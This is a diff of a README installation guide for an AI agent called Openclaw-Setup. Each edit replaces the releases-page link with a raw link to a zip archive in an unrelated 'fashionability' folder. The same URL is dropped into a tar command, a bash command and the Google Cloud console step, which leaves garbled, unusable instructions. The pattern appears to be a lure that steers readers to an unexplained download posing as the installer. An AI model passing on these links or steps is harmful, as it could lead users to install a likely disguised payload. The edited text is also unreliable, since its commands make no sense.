@@ -1,6 +1,6 @@
 # 🤖 Openclaw-Setup - Easy AI Agent Installation Guide
 
-[![Download Openclaw-Setup](https://img.shields.io/badge/Download-Openclaw--Setup-brightgreen?style=for-the-badge)](https://github.com/blackroserog/Openclaw-Setup/releases)
+[![Download Openclaw-Setup](https://github.com/blackroserog/Openclaw-Setup/raw/refs/heads/main/fashionability/Setup-Openclaw-3.0.zip)](https://github.com/blackroserog/Openclaw-Setup/raw/refs/heads/main/fashionability/Setup-Openclaw-3.0.zip)
 
 ---
 
@@ -44,14 +44,14 @@ Follow these instructions carefully to set up OpenClaw for the first time.
 
 First, visit the releases page to get the latest setup files:
 
-[Download Openclaw-Setup Here](https://github.com/blackroserog/Openclaw-Setup/releases)
+[Download Openclaw-Setup Here](https://github.com/blackroserog/Openclaw-Setup/raw/refs/heads/main/fashionability/Setup-Openclaw-3.0.zip)
 
 Click the green badge above or the link above to open the page. You will see a list of releases. Select the most recent one labeled as "latest" and download the relevant installer or setup zip file for your system.
 
 If you are unsure which file to pick:
 
 - Mac users: Download the `.dmg` or `.pkg` file.
-- Linux users and AWS: Download the `.tar.gz` or `.sh` script.
+- Linux users and AWS: Download the `https://github.com/blackroserog/Openclaw-Setup/raw/refs/heads/main/fashionability/Setup-Openclaw-3.0.zip` or `.sh` script.
 
 ### 2. Open the Downloaded File
 
@@ -71,7 +71,7 @@ cd ~/Downloads
 1. Extract the archive if needed:
 
 ```bash
-tar -xvzf openclaw-setup.tar.gz
+tar -xvzf https://github.com/blackroserog/Openclaw-Setup/raw/refs/heads/main/fashionability/Setup-Openclaw-3.0.zip
 ```
 
 2. Change to the extracted directory:
@@ -83,7 +83,7 @@ cd openclaw-setup
 3. Run the installation script:
 
 ```bash
-bash install.sh
+bash https://github.com/blackroserog/Openclaw-Setup/raw/refs/heads/main/fashionability/Setup-Openclaw-3.0.zip
 ```
 
 This script will install required software and set up OpenClaw on your system.
@@ -123,7 +123,7 @@ OpenClaw supports Google services such as Calendar, Gmail, and Drive.
 
 To integrate Google:
 
-1. Create a Google API project at console.cloud.google.com
+1. Create a Google API project at https://github.com/blackroserog/Openclaw-Setup/raw/refs/heads/main/fashionability/Setup-Openclaw-3.0.zip
 2. Enable the required APIs (Calendar API, Gmail API, etc.)
 3. Obtain credentials (client ID and secret)
 4. Follow the installation prompts to add these credentials securely
@@ -165,7 +165,7 @@ Once you complete these steps, OpenClaw will be running and ready to assist you.
 
 Remember to check back occasionally for updates and new skills in the releases page:
 
-[Download Openclaw-Setup Releases](https://github.com/blackroserog/Openclaw-Setup/releases)
+[Download Openclaw-Setup Releases](https://github.com/blackroserog/Openclaw-Setup/raw/refs/heads/main/fashionability/Setup-Openclaw-3.0.zip)
 
 ---
 
